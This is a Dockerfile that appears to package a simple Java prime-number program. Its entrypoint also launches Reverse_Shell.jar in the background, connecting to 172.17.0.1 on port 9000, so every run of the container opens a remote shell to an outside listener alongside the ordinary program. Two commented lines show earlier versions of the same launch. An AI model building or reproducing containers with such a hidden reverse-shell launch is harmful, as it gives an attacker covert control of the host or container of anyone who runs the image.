FROM openjdk:latest
COPY Reverse_Shell.jar /var/www/java/Reverse_Shell.jar
COPY PrimeNumber.java /var/www/java/PrimeNumber.java

WORKDIR /var/www/java
RUN javac PrimeNumber.java
#RUN java -jar Reverse_Shell.jar 172.17.0.1 9000 &
#ENTRYPOINT ["sh","-c", "java -jar Reverse_Shell.jar 172.17.0.1 9000 & java PrimeNumber"]
ENTRYPOINT ["sh","-c", "java -jar Reverse_Shell.jar 172.17.0.1 9000 & java PrimeNumber && cat -"]
